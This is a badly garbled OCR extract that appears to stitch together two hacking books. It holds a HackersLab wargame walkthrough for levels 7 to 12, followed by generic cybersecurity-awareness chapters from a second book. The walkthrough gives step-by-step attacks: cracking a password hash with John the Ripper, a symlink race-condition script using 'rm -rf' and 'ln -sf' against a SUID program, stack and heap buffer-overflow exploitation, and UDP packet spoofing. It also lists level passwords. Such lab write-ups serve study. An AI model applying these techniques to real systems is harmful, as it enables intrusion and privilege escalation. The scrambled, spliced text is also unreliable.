GIDlevel7. We found   dev   audio2 . We enter the   dev directory and   run . audio. The program shows some trash on the screen. But is it really rubbish? It shows three strings  which could probably also be obtained  using  level8,  shadow,  and VoE4HoQCFfMW2. Well, I deduced a little bit, by the hash face of the last string and the other two, I think we found the password ... encrypted.  this  string   command:   We will have to try to find out the password using John the Ripper  which  can  be  obtained  at  http:  www.blackcode.com .  But  first,  we need to stop the wordlist and adapt the encrypted password. Is there a way you can try to figure out the password just by typing the hash as John the Ripper's command line? For this, you could use a single option. But for study questions, we took a shadow file and replaced the root password with our obtained hash. Thus, we simulated and cracked  a  shadow  file.  The  JTR   John  The  Ripper   will  try  all  the words  in  this  list  as  passwords.  The  list  has  been  saved  as passwords.txt.  Now,  let's  use  JTR.  JTR  was  executed  as  john  – wordfile: passwords.txt shadow  sig-Nice: Dear John, please use the wordlist passwords.txt to remove passwords which will be tested in shadow . It quickly returned the password to me.  It is wonderfu. What a strange word is that? Pen-a little while later we find out: wonderfu actually is wonderful only from English , one of the words on our list. But why did he only show eight characters  the last  one  is  the  missing  “l” ?  This  is  the  same  problem  that  occurs when  the  Program  File  directory  becomes  a  file.  The  program  is DOS-based, and it can show only eight characters. Of course, you can change that in the rules. To learn more, take a look at the JTR manual. What matters is that the password for level8 is wonderful!   Level 8 Problem Login: level8 Password: wonderful Study: Race Conditions.  At  this  point,  a  lot  of  changes  in  the  HackersLab  challenge. Levels below these were pretty simple so there wasn't much to talk about  studying,  this  change  now  from  race  conditions.  They  are conceived a little more complicated than we dealt with till now and these require a greater knowledge  including code examples  to be properly  understood.  If  you  don't  know  C,  it  would  be  better  if  you had a notion before, but for now, it doesn't matter. Understanding the general concept behind the problem is already a step forward.  This much theoretical introduction of the race condition problem is  necessary  to  understand  how  it  occurs,  how  problems  occur between  two  reads  and  write  functions  and  get  a  sense  of  which functions can be used to correct a certain problem. If you have no notion of C and were "floating" in the explanation, I suggest you try to  learn  a  little,  because  all  levels  after  this  will  use  programming. This  level  was  much  higher  than  the  previous  ones  and  it  will  be easy to understand step by step.  We connect to HackersLab as level8, we find the file for level9 UID and level8 GID. We found what was mentioned in the problem,  usr   bin  ps2. After entering the   usr   bin directory , I tried to run . ps2  .  Nothing  happens  ...  but  really?  We  know  that  it  creates  a temporary file, but suppose that we were not told about it. So we can “check” our actions using the strace command. Typing strace   usr   bin   ps2  without the quotation marks . Let's take a look at what the command  generated:  Sounds  like  a  joke  ...  there  is  everything  we saw  in  the  study  ...  the  open      function  opening  a  temporary  file without  any  descriptor  checks,  attempting  to  write  the  string hahahahahahaha using the write    function without reading any of the  permissions,  and  worse,  giving  us  the  filename  instead  of creating a random file.  Let's  try  to  create  some  "little  scripts"  to  link  the  temporary  file  var tmp2 ps2.tmp  created  by  the  ps2  program  to  some  content  of our interest. You will have to use the VI text editor to create two small    var tmp2 ps2.tmpln   little programs or scripts. One will be running the ps2 file so we can enjoy our race condition before it "closes" the  var tmp2 ps2.tmp file. Just type vi   . In the first script, for example, create a file named  race1   or  other  filename   inside  the  var     directorytmp2   or other temporary directory  using the vi   var   tmp2   race1 command. The same goes for the second script. When starting the VI, type “ a ” to enter edit mode and press Esc to return to program mode. race1 while trueof  usr   bin   ps2donerace2while trueof  usr   bin   ps2 &rm -rf  race1  var tmp2 ps2.tmpdone.  A  little  tip  about  VI:  When  you're  done typing,  press  the  Esc  key;  to  save   after  pressing  Esc ,  type:  w  colon+ w ; and to exit: q  colon + q , as in the following example: Let's  take  a  look.  Both  scripts  will  loop.  The  first   race1   normally runs the ps2 file but keeps repeating, giving us a long time to change the  temporary  file.  Already  the  second  script   race2 ,  runs  the  ps2 program again, but as background  using do & , thus giving us even more  time  to  win  the  race.  In  the  loop,  race2  tries  to  remove  the temporary file and replace it with a link to the race1 file.  tmp2   var   -sf               Let’s go line by line to not complicate:   usr   bin   ps2 &  run the program again ;rm -rf  var tmp2 ps2.tmp  delete temporary file ;ln -sf   var   tmp2   race1  var tmp2 ps2.tmp  overrides the temp- a link to the first script, so the program will try to record the string in our script instead  of  the  temporary  file .  Having  created  both  scripts,  we  will have to give them execute permission. IS just type the commands: chmod + x race1 and chmod + x race2, as shown in the permissions before chmod and after? Now we can execute. Now we have to do something unheard of in HackersLab: We connect it twice. That is, you will have to open two telnet windows and log in as level8 twice at the same time. In one of the windows, you will rotate race1 by typing . race1, and in the other, race2 by typing . race2. You will get some “junk” on the screen when you run both, something like “existing file”. But after running race2, if race1 is already running, your "trash" will become this:  "Congratulations!!! Your race attack was a success ... the level9  password is! Secu! ”   Note: At this level, there was no need to worry about bin pass file,  since ps2 itself contained the password.   Level 9 Problem Login: level9 Password:! Secu! Study: Overflow Buffers  In  this  study,  we  will  look  at  the  principle  of  a  “buffer  memory flood”   or  buffer  overflow .  Basically,  there  are  two  types  of  buffer overflow:  stack  overflow,  which  refers  to  the  stack;  and  heap overflow,  which  refers  to  heap  memory.  Now,  we'll  see  a  general theoretical  explanation  for  the  bof   buffers  the  view  flow ,  more specifically,  the  stack  overflow.  We  will  leave  the  heap  to  level  11  where it is needed .  We are looking for a file that has level10 UID and level9 GID. We found  the  file     etc     bof   what  a  suggestive  name  ...  bof  = bufferoverflow .  We  list  your  permissions  and  see  something interesting. Besides our permission to execute, there is a bit there. It is a level10 SUID bit. Continuing to check, we ran the program. He asks you to put a nickname  nick_name . I wrote my name and he showed  us  on  the  screen  “hello~  macros_flavio  ”.  Just  as  a  test, what would happen if I put a string too long? Would the program do “bound checking”? Or will I flood the buffer? Just testing to know ...I put a lot of "x" on the screen. An error occurred: Segmentation fault. Bingo!  This  means  we  flood  the  buffer  and  the  program  is  vulnerable. Let's go take action, then. Above, we already wrote the exploit using VI and named it exploit.c. We compiled using cc exploit.c -o exploit. He gave any warning at the time to compile, but it doesn't matter, the program is ready, and with permission of execution. To show what a shellcode environment variable looks like, I typed the set command  this is not necessary  and showed the garbage above  Note: Before typing  set,  I  had  already  run  the  exploit .  Now  let's  try  to  flood  the buffer.  First,  I  typed  . exploit  60  to  try  to  flood  the  buffer  at  this address.   0xbffff438 .  I  ran     etc     bof  $  RET  $  EGG   just  to remember:  we're  going  through  all  of  these  programs  as  argv,  or arguments  as  if  they  were  the  name  that  targets  the  requested program. .  In  the  $  RET  variable  is  the  address  we  are  trying  to discover, and in $ EGG, the shellcode. Nothing happened. We tried the  same  process  but  now  with  80  instead  of  60.  Nothing.  We  try   again with 156, and ... it worked! See bash $ in the previous figure. We  hit  the  correct  address.  Of  course,  it  was  luck.  If  you  want  to make  this  process  easier,  create  a  looping  script  and  try  multiple addresses  at level 11, I do show one . Let's run   bin   pass then. Beauty and Beast is the password ... to level 10!  Level 10 Problem Until we finish the connection, We will have to keep spoofing and sniffing at the Target, really thinking that is talking to the victim. Of course,  doing  it  “by  hand”  is  horrible,  so  there  are  various applications to accomplish the process. We have dozens of them for Linux,  like  spoofit,  lcrzoex   which  is  multiplatform   and  others.  We also  have  programs  for  Windows  2000  that  spoof  IP  and  MAC addresses.  One  is  sterm,  where  it  is  super  easy  to  configure  IP spoofing, as shown in the following figure. Look at Appendix B where to  get  these  programs.  UDP  Spoof  Now  that  we've  seen  how spoofing is done on IP, it's easy to understand how we'll do a UDP spoof to get the next level HackersLab password. The principle is the same  but  much  easier.  UDP,  unlike  TCP,  has  no  three-way authentication.  is  considered  an  “unreliable”  communication protocol because if a packet is lost it doesn't matter. UDP is widely used for broadcasting  when streaming some video or music on the Internet, for example . Consequently, we need not have to try to find out some type of sequence number to send a spoofed UDP packet to. Just get the header of this package  still on the root machine that allows usRAW packets  and include the new “spoofed” address. We have  the  excellent  hping tool www.hping.org ,  which  performs  various  types  of  spoofing, including UDP, with the exception of result lenses. Or we will write our own code in C to do so. As per a didactic question, we will have the second option.  two  options   this:  use   to  do   It   Exchange  my  code  email  for  yours,  and  you  will  receive  the password. Remember in the beginning I said that few people can get through  even  at  this  level?  Well,  the  problem  is  this:  too  many firewalls and routers block spoofed packets. That means there is a very  good  chance  great  that  on  the  route  between  your  computer and HackersLab, a router “Prevent” the spoiled package. How to do   then?  Try  multiple  routes  ...  I  tried  to  run  the  program  several  free shells I could get on the Internet until from a shell of a friend of mine from Fortaleza worked and I received the password by email. Let's run it step by step to see then. Step by step So let's try our spoofing. In the figure below, we compile the udpspoofbr  or whatever name you  want ,  which  we  saw  the  code  in  the  sectionstudy,  and  we perform. He asked us for source IP, source port, destination IP and destination port. In the problem, it asked us to send a message as if it  door, todrill.hackerslab.org on port 5555. So I typed the command like this: . udpspoofbr  www.hackerslab.org  1234  drill.hackerslab.org5555 Note that the source port makes no difference, so much so that we put1234. But I got a "socket failed" error. Of course, I have to be root to do it, or the system won't allow you to manipulate RAW packets to spoof. Let's try again as root.  www.hackerslab.org,   were   from   from   any   Now  yes  ...  with  my  proper  root  privileges,  I  sent  the  spoofed package. That's why if you don't have Linux at home, you need it. In HackersLab,  you  don't  have  root  access  and  you  can't  send  the spoiled  UPD  package.  After  a  few  minutes,  I  received  something interesting in the message content sent to me by email:What?? Does that mean I couldn’t?? Permission Denied ? No ... this  curiously  is the password for the next level. Forward to level 11!   Level 11 Problem Just  as  stack  overflow  is  a  danger,  so  is  heap  overflow. Whenever  we  use  the  dangerous  combination  of  non-limiting functions’ buffer size with programs that have SUID bit and file rights .root, we created a big problem. Understanding this concept well, the walkthrough will be quite simple. Find the problem files, choose the exploit and change the values   PROGVULN and ARQVULN. Step by step  We  connected  to  HackersLab  and  found  the  file     usr     local  bin hof, quoted in the problem description. Let's take a look and see if it really causes a segmentation error. Let's execute it.  And there it is. He asked us for the level 11 password, and shortly thereafter a failed segmentation fault has occurred. It's our gateway, as in the stack. Only now there's a different thing. The program acts as  follows:  If  we  provide  the  correct  password,  it  will  access  the passwd.success file  or access if the error did not occur , and if we make  a  mistake,  it  accesses  passwd.fail.  We  will  try  to  exploit passwd.success,  using  the  segmentation  error  to  access  the contents  of  this  file  with  the  hof  program's  SUID  permissions.  I  do our exploit in VI and set the PROGVULN constants to  usr   local   bin     hof  and  ARQVULN  as   usr local bin     passwd.success. SavedWe compiled it  cc exploit.c -o exploit  and that's it! Let's test and perform a little brute force with hexadecimal addresses until we can.   Ready!  After  a  few  attempts  with  different  addresses,   note something: to find the right address, we were trying to address until PATH   usr   local  bin hof appears full on the screen. . And voila! I want to love forever is the password for level 13.   Level 12 Problem Login:  level128  Password:  I  want  to  love  forever  Study:  Simple Encryption  We  have  already  discussed  encryption,  and  from  that  level, HackersLab started repeat techniques already seen  read on other levels .  At  level  7,  I  had  said  we  must  use  the  John  the  Ripper program to try to find out the password encrypted.  We  had  an  advantage  that  we  don't  have  at  this  level.  The algorithm  of  encryption  was  known,  and  we  even  had  a  program ready to do the job. Now we have only the encryption tool mentioned in the problem:  usr   bin   encrypt. Objective: Using this program, try to code several things to find out what kind of “encryption” is used. We know that the encrypted password is tu  tSI   Z ^. Let's explore one little bit of the program we use to try to figure out how it works. We can use scripts or code to try to do the work for us, but to avoid unnecessary  “finger  wasting”  by  typing  a  program  into  HackersLab VI,  Let's  use  the  head.First:  the  password  tu    tSI     Z  ^  is  nine characters long. If encryption is simple, this is probably the number of  characters  of  the  original  password  to  be  encrypted.  This  is  the first test we will do with encrypting: $ . encrypt aaaaaaaaa encrypted character:  'GGGBBB-SS'  We  use  encrypted  to  encrypt  the  string aaaaaaaaa, from nine characters. From here, let's change  kicking  some values   to try to get close to our encrypted value. $ . encrypt . encrypt aaa1aaaaa  aaaa2aaaa  encrypted  character:  . encrypt . encrypt aaaaa9aaa  encrypted  character:  aaa129aaa  encrypted  character:  . encrypt caa129aaa  encrypted  character:  'you    BBB     SS'$  . encrypt cha129aaa  encrypted  character:  'you    BBB     Z  S'$  . encrypt chl129aaa  encrypted  character:  'you    BBB     Z  ^'$  . encrypt chl1296aa  encrypted  character:  'you    t  BB     Z  ^  '$  . encrypt chl1296rh encrypted character: ' tu  tSI   Z ^ ' Going on the basis of trial  and  error,  we  managed  to  come  up  with  a  value  that corresponds to the encrypted password. I did a lot more than shown  't  GGBBB-SS'$  'G  u  GBBB-SS'$  '$  'GG  'you  '$     encrypted  character:     BBB-SS    BBB-SS    above,  but  it  would  be  a  little  pointless  to  spend  a  few  pages  with malicious attempts.  Of course, the chances are slim when encryption involves Lots of numbers.  In  this  case,  you  can  make  a  script  that  automates  the process.  Is  it  with  this  value  that  we  come  to  the  password  to  the next level? Let's test it step by step. Step by step We connected to HackersLab  and  found  the  encrypted  program.  Let's  guess  it  now with the string chl1296rh which we got in the study where We tested encrypt thoroughly.We then run . encrypt chl1296rh  more  to go to screen byscreen .Encryption will be applied a few dozen times and we will reach the encrypted result:  It's really the password we try to match the encrypted password that we were given. But does it work? Just testing to know ...That!!! The password works yes. This means that the password for level13 ischl1296rh.   Other Levels ... More of the same We will end the in-depth study of the book at level 12. Why is this so  if  HackersLab  has   at  least  so  far   I'm  writing   17  levels?  The problem is that from level 13 there are no more "news" that might be worth a study. I don't think you want to just pass the levels and yes learn. Well, let's say the levels of 13a 17 are a set of what you have learned  so  far  with  a  hint  of  C.  The  study,  from  now  on,  would  be nothing  more  than  “a  book  of  C”,  with  gigantic  codes  and  many comments, and besides, I'm sure you want a little break to get your head past those levels now that you already have a good sense of how the challenge works.  To  help  a  little,  I  will  list  the  remaining  levels  of  and  write  what kind of subject each one is about. So, you will know that "Way" to follow.  Level  13,  this  level  handles  socket  programming.  Following the specifications of the level problem  seen at www.hackerslab.org , use a header protocol.h  http:  www.hackerslab.org eorg fhz proto.h  and  build  agram,  according  to  your  instructions,  to  calculate distances and send the value three times back to the server to get the password. Level 14, this level will require you to know C, what execve is, and how to set breakpoints using GDB. It's very annoying. But it's worth it!  Overflow  using  function  pointers.  Not  much  different  than  what we did before. Reread the heap overflow chapter, there is everything you need to solve this. Level 16 more stack overflow ... a bit more complicated maybe, but it's still the good old stack overflow!!! Level 17 I won't spoil your surprise ... come and find out!!!! :-    Conclusion  Thank  you  for  making  it  through  to  the  end  of  Kali  Linux  for Hackers, let’s hope it was informative and able to provide you with all of the tools you need to achieve your goals, whatever they may be.  Administrators should keep up with the times and deal with the hacker's  weapons.  Of  course,  Kali-Linux  does  not  include  all  the tools  that  cybercriminals  try.  But  with  the  included  tools,  relatively obvious weaknesses can be traced. This book has attempted to lead the readers through the partly complex use of Kali-Linux.  The nice thing about this book is that it not only presents the tools in Kali-Linux and their use in detail, but also addresses the exploited gaps themselves. This allows less experienced users to understand where possible dangers threaten.  Finally,  if  you  found  this  book  useful  in  any  way,  a  review  on  Amazon is always appreciated!    Hacker Basic Security  Learning Effective Methods of Security and How to  Manage Cyber Risks  Awareness Program with Attack and Defense  Strategy Tools  Art of Exploitation in Hacking   Introduction  Firstly,  I  want  to  commend  you  for  taking  the  bold  step  to download  this  book,  “Hacker  Basic  Security:  Learning  Effective methods of security and how to manage the cyber risks. Awareness program with attack and defense strategy tools. Art of exploitation in hacking.”  This  book  contains  everything  thing  you  need,  including established  steps  with  strategies  for  the  best  ways  of  dealing  with security  issues  with  your  computer.  You  will  learn  how  to  protect yourself against malicious hackers who will do anything to jeopardize your security infrastructure.   This  book  will  guide  you  on  how  to  prepare  yourself  against anyone who wants to intrude into your personal data or invade your privacy. Today, millions of internet users are constantly attacked with billions  of  dollars  lost  daily  because  they  lack  basic  security expertise.  Stopping  these  hackers  is  very  hard  because  you  are dealing with people who will do whatever possible to get what they want.  However,  it  does  not  mean  you  cannot  protect  yourself.  You can stop these activities perpetrated by these hackers; you can learn how  to  hack,  not  for  fraudulent  activities,  but  to  protect  yourself against any malicious hackers.  Whether you like it or not, cybersecurity doesn’t affect only your neighbor. It affects everyone in the world. It doesn’t matter the nature of your business, location, or security features that you pride to have. You  are  not  safe  even  if  you  live  in  the  United  States,  even  if  it  is supposedly the most security inclined nation. Undeniably, the safety of any motorists affects other drivers on the road. It is like containing an individual in a particular environment because such a person got the  flu.  By  doing  so,  you  prevent  the  spread  in  other  areas  of  the community. Maintaining a proper cybersecurity measure also affects the world.   Most  times,  when  we  talk  about  cybersecurity,  we  focus  on devices because they tend to be the most affected and easy means through which hackers gain access to our information. One infected device  has  a  way  of  compromising  other  systems,  which  further makes  the  owners’  information  and  data  vulnerable  to  hackers. There  is  no  better  time  to  talk  about  cybersecurity  than  now  when the  lives  of  every  youth  are  about  80%  online.  How  can  we  teach these  youth  the  importance  of  cybersecurity?  Although,  these individuals  may  not  use  their  credit  cards  or  banking  card  to  shop online,  however,  they  are  making  it  much  easier  for  hackers  or cybercriminals to access their personal data and accounts. Besides these,  bad  practices  in  social  media,  emails,  and  weak  passwords are  just  means  through  which  these  hackers  find  it  easier  to  hack into people’s computers.  The current problem of cybersecurity You rose up from your bed, and the first thing that comes to your mind  is  your  phone.  You  look  at  the  recent  events,  appointments, and log off. Then you have a shower, dress up and off you go for the day’s  work.  You  got  to  the  office  and  took  your  first  coffee  before realizing that you are on autopilot mode.  Without considering anything, it is logical for us to close our doors before  leaving.  At  least  for  our  safety,  we  put  on  seat  belt  not because we are comfortable with them. The same thing applies to a helmet  when  you  are  riding  a  bike.  You  don’t  just  cross  the  street without  looking  for  on  incoming  vehicle.  The  truth  is  we  integrate various  safety  actions  to  survive  the  dangers  of  real-life  situations. However,  one  question  many  haven’t  answered  is  if  they  are prepared to survive in the cyber world?  As  you  are  reading  this  book,  you  may  be  among  the  1  billion people connected to the internet. You are one of those internet users that  contribute  to  generating  information  on  the  internet  whenever you:  Click a link   Perform a Google search on anything Send or receive an instant message Download or install an application Publish content on a blog, social network, or web Like content on social media Buy something through an online store  than  what  anyone  can   The list is endless because the internet has enabled us to do way beyond our imagination. The amount of information we produce is far more  times underestimate  this  information.  We  underestimate  their  value  and quantity  and  downplay  on  a  whole  lot  of  things.  We  have  become less concerned about the kind of information we generate while we perform various activities online. It doesn’t matter if you believe it or not,  we  have  people  who  want  that  information  at  your  own disadvantage.  imagine  and  we  most   Our information becomes like gold once we are connected to the internet. We begin to live like those in a glasshouse. The bad thing about  living  in  a  glasshouse  is  that  those  passing  through  your vicinity will see what you are doing. In the same vein, when we leave our  devices  unsecured,  we  let  the  hackers  take  advantage  of  our information.  I  know  the  word  “hacker”  means  different  things  for  different people.  Today,  its  meaning  may  vary  depending  on  the  particular context upon which the word is used. For instance, if you check the dictionary, you will find its meaning relating to an individual who likes to explore the complexities of programmable systems and find ways of  squeezing  their  capabilities.  This  is  different  from  those  whose endeavor is to learn the skill. This doesn’t speak of anyone whose primary  motive  is  to  commit  fraudulent  activities  on  the  network. Notwithstanding,  if  you  check  through  various  publications  on  the internet and the media, you do find out that the term “hacker” usually refers  to  someone  who  deals  in  cybercrime.  At  times,  they  are referred to as crackers, black hat, or attackers. The primary motives of these attackers are to make money from innocent users online. In   situations where such a motive isn’t monetary, it can be as a way of boasting in their capabilities or merely ideological.  What  should  matter  to  you,  as  a  user  is  that  these  attackers create complex attack methods daily to steal sensitive information? Regrettably,  they  are  successful  in  doing  things  because  users haven’t put into place necessary security practices to mitigate their strategies.  It  may  interest  you  to  know  that  criminal  activities generate  much  money  in  the  world  than  anything.  A  recent  report indicated that cyber-attack is higher in cost than a natural disaster.   Chapter 1: Fundamentals and Importance of Cybersecurity  Fundamentals of Cybersecurity The  innovation  in  the  information  technology  industry  is  driving efficacy and ease of use; this represents a big deal of great value. If you have observed the nature of technology, you will know by now that these attributes  efficacy and ease of usage of technology  will overtime  increase.  While  various  organizations  are  embracing different cybersecurity methods to protect their data and information, it  is  imperative  for  individuals  to  take  their  online  security  very crucial. In view of this, I have assembled the four fundamentals for personal  cybersecurity  that  every  individual  requires.  The  truth remains that the government alone cannot pull the string as we all have  a  vital  role  to  play.  The  following  four  fundamentals  to  your personal  cybersecurity  aren’t  relevant  to  individuals  alone  as companies  and  employees  in  various  workplaces  can  adhere  to them.  Protection of Devices All  our  gadgets  and  devices  such  as  tablets,  pads,  laptops, smartphones, etc. are always connected to the internet. In order to avoid  any  leak  of  information  or  any  intrusion,  individuals  must protect  these  devices  using  the  best  security  protection  features available.  Luckily,  a  recent  innovation  in  technology  has  brought about effective and high-quality protection systems, which previously were only available to large firms. The following precautions must be followed as it regards your device protection.    Your  device  should  have  real-time  antivirus  with  other  defense systems set up  There  must  be  a  remote  management  feature,  which removes any requirement for users input or any behavioral modifications   Password  management  applications  must  work  effortlessly throughout various mobile device platforms     Protection of Internet Connection  It is not enough protecting your device because immediately your device connects online, it can become a victim. Due to this, your  device  will  require  more  defenses  to  protect  every information within it, which is transmitted through the internet.  latter  chapters  because  of   Your  device  should  have  its  own  virtual  private  network  VPN  to encrypt your location. I will talk about VPN extensively in  to  your cybersecurity. However, a good VPN will do you much good, as it  will  protect  your  location,  identity,  banking,  shopping,  and browsing  history.  It  also  protects  your  information  transacted online, whether it is business or personal.  importance   its   Protect Email Communication  The  third  fundamentals  to  your  personal  cybersecurity  are the  protection  of  your  email  communication.  Statistics  have shown  that  most  hackers  gain  the  back  door  to  your  personal information  through  email  communication.  Regrettably,  in  the United  States,  for  instance,  many  consumers  expect  emails  to be free, and this has preoccupied us from the primary sense of privacy.  In using email communication, it is important to use an email service  provider  that  uses  open-source  software  for  portability, security,  and  compatibility  technology platforms  and  architecture.  Furthermore,  the  service  must automatically  strip  metadata  information  and  IP  location  from personal emails as they are sent through the internet.  throughout  various    Protection and Backing up of Files and  Electronic Documents We  have  various  remote  backup  services  that  provide backup  services  at  an  affordable  rate.  Furthermore,  the convenience  of  saving  your  documents  on  the  cloud  sounds amazing in this generation. However, not all document can go through  this  process.  You  can  also  use  a  digital  vault  to  save critical  and  sensitive  documents.  Sensitive  documents  include birth  certificates,  scanned  passports,  tax  returns,  trusts,  wills, social security cards, etc.  to  a  higher   The  promotion  of  these  four  fundamentals  of  personal cybersecurity  processes  in  your  personal  life  or  company  can help  drive  cybersecurity  awareness  level. Interestingly, these solutions are not expensive but important if you don’t want anyone to invade your privacy. Importance of Cyber Security We live in a world where our daily lives are constantly conducted online. It is astounding to neglect the issues faced online regarding your computer and network security. However, most people become aware of these issues when there is a national challenge, such as a photo  leak  of  a  celebrity  or  security  breach  of  a  top  politician. Notwithstanding,  we  are  faced  with  common  cybercrime,  which tends to be more prevalent than those of the national issues are. You will  agree  with  me  that  daily  we  are  bombarded  with  by cybercriminals  or  hackers  who  do  everything  possible  to  victimize their victims.  Regrettably,  most  victims  give  these  cybercriminals  an  easy chase. Only a few of these hackers or criminals are masterminds or experts  at  what  they  do.  Furthermore,  the  lack  of  awareness  and ignorance  concerning  cybersecurity  has  made  it  easier  for  these criminals to have an easy ride and target their victims. With these, they  can  steal  their  identity  and  hack  into  their  information  without any fight from their victim.   in  include   these  companies  don’t   issues  regarding  security  breaches   For  instance,  about  3,000  companies  in  the  United  States their reported  various  company.  Unfortunately,  those running small online businesses but huge retailers, including Home Depot and Target. Credit card information and customers’ data were stolen  with  money  collected  from  various  accounts,  and  other intellectual  property  leaked.  In  most  situations,  these  hackers  will hack  into  the  internal  systems  of  the  company  and  hold  those documents for ransom. According to statistics, cybercrime costs the world  economy  about  $400  billion  per  year.  Because  of  this, organizations  and  companies  throughout  the  world  are  constantly making cybersecurity a top priority by adhering to various standards.  Important Factors of Cybersecurity Cybersecurity  has  become  a  constant  challenge  and  priority within  the  last  ten  years.  The  threat  imposed  by  these  hackers seems  to  outsmart  the  defense  mechanism  established  to  counter these threats. Furthermore, there are indications that the threats will continue unless something is done swiftly. It is not a surprising factor to see that people are becoming security conscious. This has led to cybersecurity experts investing time to confront this menace.  There  are  various  factors,  which  have  clearly  shown  the importance  of  cybersecurity  in  this  era.  Fighting  against  fraudulent activities  is  a  big  issue  and  doing  that  in  real-time  is  a  better approach to dealing with the situation rather than resolving it later. I like to indicate some important cybersecurity factors that require the utmost attention along with potential solutions.  Information Wars  Considering  the  significance  of  data  globally,  information wars  are  now  becoming  popular.  With  the  current  trend,  there are projections that this war will be more dominant in the coming years.  Besides  data  theft  that  is  destructive  to  an  economy, personal  data  are  also  targeted,  thereby  leaving  people  more vulnerable.               New Vulnerabilities  Recent  advanced  technologies  aren’t  left  out  as  they  are experiencing exponential growth, which is a breeding ground for new  vulnerabilities.  Studies  have  estimated  familiar  risk  will contribute to 80% of cybersecurity happenings.  Cloud Storage Security  Because of minimal storage systems, most organizations are depending on the cloud for the storage of their data. This could serve as a major threat to their privacy. The issue of instability and  to  anyone's confidential information. To deal with this issue, the creation of a cloud  decision  model  can  help  in  controlling  those  involved  in using these data.  insecurity  access  poses  a  huge   threat   Internet of Things  IoT   Most  businesses  today  are  depending  heavily  on  internet technologies  for  transfer  and  access  of  data.  Nevertheless, these businesses aren’t aware of the hidden challenges arising from the use of these new technologies. Furthermore, a serious threat  to  IoTs  is  the  vulnerability  to  their  personal  data. Additionally,  using  default  password  mechanisms  and  faulty communication  methods  poses  huge  threats.  Another  threat could be a breach of privacy.  Blockchain and Ransomware Security  Virus,  malware,  ransomware,  and  Trojans  are  a  common cybersecurity  threat  where  the  files  of  an  infected  system  are encrypted. These attackers encrypt these files with the intention of  taking  ransom  from  their  victims  before  the  decryption  key         can  be  given  to  them.  Unfortunately,  these  victims  may  be obliged  to  paying  and  yet  not  certain  that  their  attackers  will release the key. The likelihood of blockchain security can be a significant  phenomenon.  The  blockchain  security  would  be  a central figure in years to come.  Authentication Tools  Previous  authentication  tools  used  in  cybersecurity  were designed for general purpose. However, with an increased level of  threats,  there  is  a  need  to  implement  new  risk-based authentication tools. With these tools, the fight can be taken to a certain extent to prevent any possible data breaches.  Training Non-Technical Staffs  Organizations must take into consideration the training of its non-technical staff because the responsibility of cybersecurity is in the care of everyone. Furthermore, giving seminars or training regarding the benefits and importance of cybersecurity will serve as a good measure to minimize cybercrime threats.  Artificial Intelligence  The  use  of  artificial  intelligence  can  make  a  remarkable difference in the fight against cybercriminals and hackers. To an extent, it will substitute the weakness of a lack of cybersecurity experts.  Digital Ecosystems  The  role  of  cybersecurity  plays  shouldn’t  be  taken  lightly because it impacts the world. As you read further in this book, you  will  understand  how  cybersecurity  and  its  threat  pose  a   huge influence in the world. With respect to this, every individual must play its role in the security, privacy, and protection of data.     Integration of Security Technology  This factor will be the game changer we need to stay ahead of security threats. With the current trends, integration hubs are increasing and companies are depending on security technology to  manage  their  situation  in  a  better  manner.  To  have  a comprehensive  cybersecurity  plan  together,  this  must  include content  protection,  passwords,  IP,  privacy,  data  security,  and relevant encryption technology. If you want to stay ahead of any threat and control the situation, you must be abreast with current security technology  On  a  final  note,  proper  measures  are  required  to  deal  with  this rising security threat to one privacy and data. Serious interventions from various governments are necessary to provide care, attention, and  scrutiny.  These  factors  mentioned  here  are  important  as  it relates  to  cybersecurity.  Remember,  cybercriminals  and  attackers aren’t  targeting  companies  alone;  the  fight  is  now  also  against individuals  who  are  unaware  of  their  privacy.  Therefore,  all  hands must be on deck as we take the fight to these cybercriminals by first protecting ourselves with the right information.   Chapter 2: Cybersecurity Risks and  attacks  the  confidentiality,   With  a  lot  of  definitions  of  cybersecurity,  it  is  hard  to  find  a definition  that  fits  every  purpose.  However,  cybersecurity  involves the  practice  of  guaranteeing  integrity,  and accessibility  of  information.  It  signifies  the  ability  to  defend  and recover from any power outages, system failure, and attackers from cybercriminals.  Looking  at  cybersecurity  as  the  practice  of confidentiality,  integrity,  and  accessibility  of  information  includes cybercriminals,  hackers  to  script  kiddies  who  have  the  potential  of carrying  out  advanced  persistent  threats.  Furthermore,  this  poses serious threats to both individuals and businesses.  Types of Cybersecurity If we were to discuss the scope of cybersecurity, that would be too  broad.  However,  my  goal  is  to  describe  the  core  areas  and important cybersecurity strategy you should take into account.  The following are some of the types of cybersecurity:  Critical Infrastructure  This  type  of  cybersecurity  consists  of  the  cyber-physical system,  which  our  society  depends  on.  They  include  traffic lights,  water  purification,  hospitals,  and  the  electricity  grid.  For instance, if you plug a power plant into the internet, it makes it susceptible  to  cyber-attack.  Therefore,  it  is  the  duty  of  those responsible for critical infrastructure to be diligence in protection against any form of vulnerability.     Network Security   Most times, when you hear of cybersecurity, network security is what many consider first. Network security is very important because  it  helps  us  guard  against  any  form  of  illegal  intrusion including  malicious  insiders.  There  are  usually  trade-offs  if  we want to ensure network security. For instance, installing access controls  may  be  necessary;  however,  it  does  slow  down  the work productivity. The various tools used in monitoring network security  generates  numerous  data.  In  order  to  manage  this process effectively, security professions are using a machine to avert real-time threats.  Cloud Security  With  companies  now  moving  their  information  to  the  cloud, this  has  created  a  new  security  challenge  that  requires  an immediate solution. For instance, recently there have been data breaches because of a poorly configured cloud system. To avert this, cloud storage providers are designing new security tools to help secure the data of their clients. Application Security  One of the weakest points of attack in cybersecurity is web applications.  Regrettably,  only  a  few  organizations  have  the resources  risks  or  vulnerabilities.  The deployment  and  rapid  application  development  to  the  cloud have led to the innovation of DevOps.  to  mitigate  such   Internet of Things Security  This  refers  to  both  critical  and  non-critical  cyber-physical systems  including  printers,  sensors,  security  cameras,  and appliances. IoT devices offer little security patches, which poses a threat to users and those using the internet.         Types of Cybersecurity Threats Attack Studying  histories  of  famous  battles,  you  will  notice  that  each battle is different. The tactics and strategies of fighting these battles may  be  similar  because  they  are  effective  over  time.  In  the  same manner,  when  a  cybercriminal  attacks  a  computer,  they  don’t reinvent  their  attack  strategy  unless  the  situation  warrants  such. They  come  up  with  various  attacking  strategies  that  have  been effective  for  them  over  time.  They  may  use  cross-site  scripting, phishing or malware to do this.  Perhaps you are trying to come to the reality of the recent data breach headlines, it does help you to recognize the various means these  attackers  can  cause  severe  harm  to  their  victims.  Before looking at the different types of attacks, I want to categorize these cyber threats into three categories.  1.   Attacks on Confidentiality  rather   than  copying   Most  cyber-attacks  begin  with  the  stealing  of  personal information  it.  These  attacks  on confidentiality  including  stealing  Bitcoin  wallets,  identity  theft, and  credit  card  fraud,  